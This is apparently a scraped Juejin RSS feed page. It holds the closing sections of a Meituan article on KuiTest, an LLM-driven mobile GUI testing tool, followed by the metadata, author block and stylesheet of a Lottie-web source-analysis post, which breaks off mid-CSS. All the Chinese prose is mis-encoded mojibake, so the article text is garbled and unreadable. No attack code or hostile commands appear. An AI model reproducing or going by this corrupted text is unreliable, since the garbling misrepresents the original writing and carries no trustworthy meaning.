<p>ç›®å‰ï¼ŒKuiTest å·²åœ¨ç¾å›¢çš„å¤šç±»ä¸šåŠ¡åœºæ™¯ä¸­è½åœ°åº”ç”¨ï¼Œè¿‡å» 6 ä¸ªæœˆæœ‰ 20 ä¸ªä¸šåŠ¡æ–¹å‘ä½¿ç”¨ï¼Œæ€»æ‰§è¡Œ <strong>21 ä¸‡+Casesã€8000 å¤šä¸ª Jobsï¼Œè¿‘æœŸå‘¨å‡è§¦å‘ 5000 å¤šä¸ª Cases</strong>ï¼›åœ¨å¤šä¸ªå®æµ‹é¡¹ç›®å¦‚é¸¿è’™é€‚é…ã€ç¥ä¼šå‘˜åœ°ç†ä¼ å‚å·¡æ£€ã€é…’åº—å•†å®¶å¤šè¯­è¨€é€‚é…ç­‰ï¼ŒKuiTest å‘ç°äº†ç™¾ä½™ä¾‹æœ‰æ•ˆçš„ UI åŠŸèƒ½ç¼ºé™·ã€‚</p>
<h3 data-id="heading-10">4.1 HarmonyOS NEXT å¹³å°éå†</h3>
<p>ä¼ ç»Ÿçš„ GUI æµ‹è¯•è„šæœ¬çš„è®¾è®¡ä¾èµ–äº App çš„ UI é€»è¾‘ï¼Œä½†æ˜¯ä¸åŒæ“ä½œç³»ç»Ÿä¸ŠåŒä¸€ App çš„æœ‰æ‰€å·®å¼‚ï¼Œè¿™ç§å·®å¼‚ä¼šå¯¼è‡´åœ¨ä¸€ä¸ªç³»ç»Ÿä¸Šè®¾è®¡çš„è„šæœ¬åœ¨å¦ä¸€ä¸ªç³»ç»Ÿä¸Šå¤±æ•ˆï¼Œå› æ­¤ä½¿å¾—è·¨å¹³å°çš„æµ‹è¯•ååˆ†å›°éš¾ï¼Œéœ€è¦æµ‹è¯•äººå‘˜æ‰‹åŠ¨è°ƒæ•´ç”šè‡³é‡æ–°è®¾è®¡æµ‹è¯•è„šæœ¬ï¼Œé€‚é…æˆæœ¬è¾ƒå¤§ã€‚</p>
<p>ç¾å›¢ App åœ¨ Android/iOS å¹³å°çš„æµ‹è¯•è„šæœ¬è¾ƒä¸ºå®Œå–„ï¼Œä½†æ˜¯åœ¨ HarmonyOS NEXT å¹³å°çš„æµ‹è¯•è„šæœ¬ä»åœ¨å®Œå–„ä¹‹ä¸­ï¼Œå¤§é‡é¡µé¢ä»å¤„äºæœªæµ‹è¯•çŠ¶æ€ã€‚å› æ­¤ï¼ŒKuiTest è¢«ç‡å…ˆéƒ¨ç½²äºè¯¥å¹³å°çš„ç¨³å®šæ€§å·¡æ£€ä¸­ï¼Œæ ¹æ®æŒ‡å®šä¸šåŠ¡èµ·å§‹é¡µé¢ï¼Œè‡ªåŠ¨åœ°è¿›è¡Œè·¨é¡µé¢éå†ï¼Œè¯†åˆ«å¹¶éªŒè¯å´©æºƒã€æŠ¥é”™ã€åŠŸèƒ½ä¸ç¬¦åˆé¢„æœŸçš„æƒ…å†µï¼Œä»¥å‡å°‘é‡æ–°è®¾è®¡æµ‹è¯•è„šæœ¬çš„æˆæœ¬ã€‚</p>
<p>é¡¹ç›®ä¸­è¦†ç›–é¦–æ‰¹é€‚é…çš„ 3 é¡¹ä¸šåŠ¡ï¼Œ<strong>é¡¹ç›®äº¤ä»˜å‘¨æœŸæ€»ä½“ç´¯è®¡è¿è¡Œ 1230 å°æ—¶ã€å…± 4 ä¸‡+ä¸ªè‡ªåŠ¨åŒ–æµ‹è¯•ç”¨ä¾‹ï¼Œå‘ç° 34 ä¸ªæœ‰æ•ˆå¼‚å¸¸</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87dea501422c4a02bc20c36f0f2e8510~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=OvPGhe6vDibmsRjgZRr2qPRJdy0%3D" alt="å›¾ 6 - å‘ç°çš„ç¼ºé™·ä¸¾ä¾‹" loading="lazy"/></p>
<h3 data-id="heading-11">4.2 å¤§å‰ç«¯å›å½’å·¡æ£€</h3>
<p>ç”±äºç¾å›¢ App çš„æ›´æ–°é€Ÿåº¦ååˆ†å¿«é€Ÿï¼Œå› æ­¤æ¯å‘¨éƒ½éœ€è¦è¿›è¡Œå›å½’å·¡æ£€ã€‚ä¼ ç»Ÿçš„æµ‹è¯•è„šæœ¬çš„æ–¹æ³•ç”±äºäººåŠ›æ¶ˆè€—è¿‡å¤§ï¼Œå¾€å¾€åªèƒ½è¦†ç›– App ä¸­çš„æ ¸å¿ƒä¸šåŠ¡åŒºåŸŸï¼Œä½†æ˜¯å…¶ä»–åŒºåŸŸçš„ Bug å®é™…ä¹Ÿä¼šå½±å“ç”¨æˆ·ä½“éªŒã€‚è€Œ KuiTest èƒ½å¤Ÿæµ‹è¯•ä¸€å¼ é¡µé¢çš„æ‰€æœ‰å¯äº¤äº’ç»„ä»¶ï¼Œä»¥ä¸€ç§ä½æˆæœ¬çš„æ–¹å¼æé«˜æµ‹è¯•è¦†ç›–ç‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°† KuiTest è¿ç”¨åœ¨ç¾å›¢çš„å¤§å‰ç«¯å›å½’å·¡æ£€å½“ä¸­ï¼šæˆªè‡³ç›®å‰ï¼ŒKuiTest å·²ç»è¶…ä¸€å¹´ç¨³å®šè¿è¡Œï¼Œç´¯è®¡æ£€æµ‹å‡ºäº† 140+æœ‰æ•ˆå¼‚å¸¸ã€‚</p>
<h2 data-id="heading-12">5. è®¤çŸ¥ä¸å±•æœ›</h2>
<p>KuiTest ä½œä¸ºæ— è§„åˆ™çš„ç§»åŠ¨åº”ç”¨ GUI åŠŸèƒ½æµ‹è¯•å·¥å…·ï¼Œæ ‡å¿—ç€è½¯ä»¶æµ‹è¯•é¢†åŸŸå‘æ™ºèƒ½åŒ–ã€è‡ªåŠ¨åŒ–æ–¹å‘è¿ˆå‡ºçš„æ¢ç´¢ä¸€æ­¥ã€‚è¯¥å·¥å…·é€šè¿‡åˆç†çš„ä»»åŠ¡æ‹†è§£ä¸å¤šæ¨¡æ€ UI ç»„ä»¶åŠŸèƒ½è¯†åˆ«å°†å¤§æ¨¡å‹é€šè¯†ä½œä¸ºæµ‹è¯•é¢„è¨€ï¼Œåˆ©ç”¨å…¶å¹¿æ³›çš„çŸ¥è¯†æ¨¡æ‹Ÿç”¨æˆ·æœŸæœ›ï¼ŒæˆåŠŸçªç ´äº†ä¼ ç»ŸåŸºäºè§„åˆ™æµ‹è¯•æ–¹æ³•çš„å±€é™æ€§ï¼Œåˆ‡å®æå‡äº† LLM åœ¨ GUI æµ‹è¯•åœºæ™¯ä¸­çš„å¯é æ€§å’Œå®ç”¨æ€§ã€‚</p>
<p>å½“å‰ KuiTest ä¸»è¦èšç„¦äºå•æ­¥äº¤äº’çš„åŠŸèƒ½éªŒè¯ï¼Œè¿™æ˜¯å‡ºäºå¯¹æµ‹è¯•å¯é æ€§å’Œæ•ˆç‡çš„æƒè¡¡è€ƒè™‘ã€‚ç„¶è€Œï¼Œå‘å¤šæ­¥äº¤äº’åœºæ™¯æ‰©å±•æ˜¯ä¸€ä¸ªè‡ªç„¶ä¸”å¿…è¦çš„å‘å±•è¶‹åŠ¿ï¼ŒçœŸå®ç”¨æˆ·åœºæ™¯ä¸­å­˜åœ¨å¤§é‡éœ€è¦å¤šæ­¥æ“ä½œæ‰èƒ½è§¦å‘çš„å¤æ‚åŠŸèƒ½ bugï¼Œä¾‹å¦‚ï¼Œåœ¨æ‰§è¡Œæ“ä½œåºåˆ—â€œæŸ¥çœ‹è®¢å•åˆ—è¡¨ â†’ ç‚¹å‡» "å¾…ä»˜æ¬¾" è®¢å• â†’ é€‰æ‹©é€€æ¬¾ â†’ ç¡®è®¤é€€æ¬¾åŸå› â€æ—¶å‘ç°ç‚¹å‡»â€œå¾…ä»˜æ¬¾â€åï¼Œé¡µé¢å´æ˜¾ç¤ºâ€œé€€æ¬¾è®¢å•â€ã€‚</p>
<p>æœªæ¥ç ”ç©¶åº”å½“æ¢ç´¢å¦‚ä½•å°†æµ‹è¯•èƒ½åŠ›æ‰©å±•åˆ°é•¿é“¾è·¯äº¤äº’åœºæ™¯ã€‚é’ˆå¯¹é•¿é“¾è·¯ Bug åˆ†æï¼Œéœ€è¦å»ºç«‹çŠ¶æ€è¿½è¸ªæœºåˆ¶æ¥è®°å½•æ¯ä¸€æ­¥äº¤äº’åçš„ UI çŠ¶æ€å˜åŒ–ï¼Œé€šè¿‡å¯¹æ¯”é¢„æœŸçŠ¶æ€ä¸å®é™…çŠ¶æ€çš„å·®å¼‚æ¥è¯†åˆ«å¼‚å¸¸èŠ‚ç‚¹ï¼ŒåŒæ—¶åˆ©ç”¨ LLM çš„æ¨ç†èƒ½åŠ›å»ºç«‹æ“ä½œæ­¥éª¤ä¹‹é—´çš„å› æœå…³ç³»é“¾ï¼Œå½“æ£€æµ‹åˆ°åŠŸèƒ½å¼‚å¸¸æ—¶èƒ½å¤Ÿå›æº¯å®šä½æ˜¯å“ªä¸€æ­¥æ“ä½œå¯¼è‡´äº†é”™è¯¯ï¼Œè¿™ç§å› æœæ¨æ–­èƒ½åŠ›å¯¹äºå¤æ‚äº¤äº’åºåˆ—ä¸­çš„ Bug å®šä½è‡³å…³é‡è¦ã€‚åŒæ—¶ï¼Œå¯ä»¥å¼•å…¥åŸºäºå†å² Bug æ•°æ®çš„å­¦ä¹ æœºåˆ¶, åˆ†æè¿‡å¾€å‘ç°çš„é•¿é“¾è·¯ Bug æ¨¡å¼ï¼Œè‡ªåŠ¨ç”Ÿæˆç±»ä¼¼çš„é«˜é£é™©æµ‹è¯•è·¯å¾„ï¼Œä¼˜å…ˆæ¢ç´¢å®¹æ˜“å‡ºç°é—®é¢˜çš„æ“ä½œåºåˆ—ç»„åˆã€‚è¿™ç§æ™ºèƒ½åŒ–çš„è·¯å¾„ç”Ÿæˆä¸ä»…èƒ½æé«˜æµ‹è¯•æ•ˆç‡ï¼Œè¿˜èƒ½æ˜¾è‘—æå‡å¯¹å¤æ‚åŠŸèƒ½ Bug çš„æ£€æµ‹èƒ½åŠ›ã€‚</p>
<h2 data-id="heading-13">6. åˆä½œæ–¹ç®€ä»‹</h2>
<p>å¤æ—¦å¤§å­¦å‘¨æ‰¬å¸†æ•™æˆå›¢é˜Ÿè‡´åŠ›äºæ–°å‹è½¯ä»¶ç³»ç»Ÿçš„æ€§èƒ½ä¼˜åŒ–ä¸æ•…éšœæ’æŸ¥ç ”ç©¶ï¼Œè¿‘å¹´å›¢é˜Ÿåœ¨è½¯ä»¶ç³»ç»Ÿé¢†åŸŸçš„é‡è¦ä¼šè®®å¦‚ OSDIã€SOSPã€ICSEã€FSE ç­‰å‘è¡¨äº†å¤šç¯‡é«˜å½±å“åŠ›è®ºæ–‡ã€‚æœ€è¿‘ï¼Œè¯¥å›¢é˜Ÿä»¥è§£å†³ UI è‡ªåŠ¨åŒ–æµ‹è¯•ä¸­çš„å¤æ‚é—®é¢˜ä¸ºæ ¸å¿ƒï¼Œå°†å¤§æ¨¡å‹åº”ç”¨äº UI åŠŸèƒ½è®¤çŸ¥ä¸ UI äº¤äº’è§„åˆ’ï¼Œä»¥ä¸€ç³»åˆ—åˆ›æ–°æ–¹æ³•æ˜¾è‘—æé«˜äº†è§£å†³æ–¹æ¡ˆçš„é€‚åº”æ€§å’Œç¨³å®šæ€§ã€‚å›¢é˜Ÿæ³¨é‡ç§‘ç ”æˆæœçš„å®é™…åº”ç”¨ï¼Œç§¯æä¸ä¼ä¸šåŠç›¸å…³æœºæ„åˆä½œï¼Œå…±å»ºå®ç”¨å·¥å…·å’Œç³»ç»Ÿï¼Œæ¨åŠ¨ç ”ç©¶æˆæœçš„è½åœ°ï¼ŒåŠ©åŠ›åˆä½œä¼™ä¼´æå‡æŠ€æœ¯èƒ½åŠ›å¹¶å®ç°ä¸šåŠ¡ä»·å€¼ã€‚</p>
<p><strong>æ³¨é‡Š</strong></p>
<ul>
<li>[1] vision-ui æ¨¡å‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMeituan-Dianping%2Fvision-ui" target="_blank" title="https://github.com/Meituan-Dianping/vision-ui" ref="nofollow noopener noreferrer">ç¾å›¢è§†è§‰ UI åˆ†æå·¥å…·</a></li>
<li>[2] SoMï¼ˆSet-of-Markï¼‰ç­–ç•¥ï¼šYang J, Zhang H, Li F, et al. Set-of-mark prompting unleashes extraordinary visual grounding in gpt-4v [J]. arXiv preprint arXiv: 2310.11441, 2023.</li>
<li>[3] CLIPï¼ˆContrastive Languageâ€“Image Pre-trainingï¼‰æ¨¡å‹ï¼šRadford A, Kim J W, Hallacy C, et al. Learning transferable visual models from natural language supervision [C]//International conference on machine learning. PMLR, 2021: 8748-8763.</li>
</ul>
<p>| å…³æ³¨ã€Œç¾å›¢æŠ€æœ¯å›¢é˜Ÿã€å¾®ä¿¡å…¬ä¼—å·ï¼Œåœ¨å…¬ä¼—å·èœå•æ å¯¹è¯æ¡†å›å¤ã€2024å¹´è´§ã€‘ã€ã€2023å¹´è´§ã€‘ã€ã€2022å¹´è´§ã€‘ã€ã€2021å¹´è´§ã€‘ã€ã€2020å¹´è´§ã€‘ã€ã€2019å¹´è´§ã€‘ã€ã€2018å¹´è´§ã€‘ã€ã€2017å¹´è´§ã€‘ç­‰å…³é”®è¯ï¼Œå¯æŸ¥çœ‹ç¾å›¢æŠ€æœ¯å›¢é˜Ÿå†å¹´æŠ€æœ¯æ–‡ç« åˆé›†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/89308933a541498590ec1ac5230750a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg576O5Zui5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768875960&amp;x-signature=eKt7FWWIhOdMvg6ix8MxDfaV59E%3D" alt="" loading="lazy"/></p>
<p>| æœ¬æ–‡ç³»ç¾å›¢æŠ€æœ¯å›¢é˜Ÿå‡ºå“ï¼Œè‘—ä½œæƒå½’å±ç¾å›¢ã€‚æ¬¢è¿å‡ºäºåˆ†äº«å’Œäº¤æµç­‰éå•†ä¸šç›®çš„è½¬è½½æˆ–ä½¿ç”¨æœ¬æ–‡å†…å®¹ï¼Œæ•¬è¯·æ³¨æ˜â€œå†…å®¹è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿâ€ã€‚æœ¬æ–‡æœªç»è®¸å¯ï¼Œä¸å¾—è¿›è¡Œå•†ä¸šæ€§è½¬è½½æˆ–è€…ä½¿ç”¨ã€‚ä»»ä½•å•†ç”¨è¡Œä¸ºï¼Œè¯·å‘é€é‚®ä»¶è‡³ <a href="https://link.juejin.cn?target=mailto%3Atech%40meituan.com" target="_blank" title="mailto:tech@meituan.com" ref="nofollow noopener noreferrer">tech@meituan.com</a> ç”³è¯·æˆæƒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Lottie-web æºç è§£æï¼ˆä¸€ï¼‰ï¼šä» JSON Schema è®¤è¯† Lottie åŠ¨ç”»çš„æœ¬è´¨ğŸ“’]]></title>    <link>https://juejin.cn/post/7594389937463033866</link>    <guid>https://juejin.cn/post/7594389937463033866</guid>    <pubDate>2026-01-13T02:34:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594389937463033866" data-draft-id="7583980250734116927" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Lottie-web æºç è§£æï¼ˆä¸€ï¼‰ï¼šä» JSON Schema è®¤è¯† Lottie åŠ¨ç”»çš„æœ¬è´¨ğŸ“’"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,CSS"/> <meta itemprop="datePublished" content="2026-01-13T02:34:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“¨å«å“¥"/> <meta itemprop="url" content="https://juejin.cn/user/2159893031168119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Lottie-web æºç è§£æï¼ˆä¸€ï¼‰ï¼šä» JSON Schema è®¤è¯† Lottie åŠ¨ç”»çš„æœ¬è´¨ğŸ“’
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2159893031168119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“¨å«å“¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:34:12.000Z" title="Tue Jan 13 2026 02:34:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»41åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body 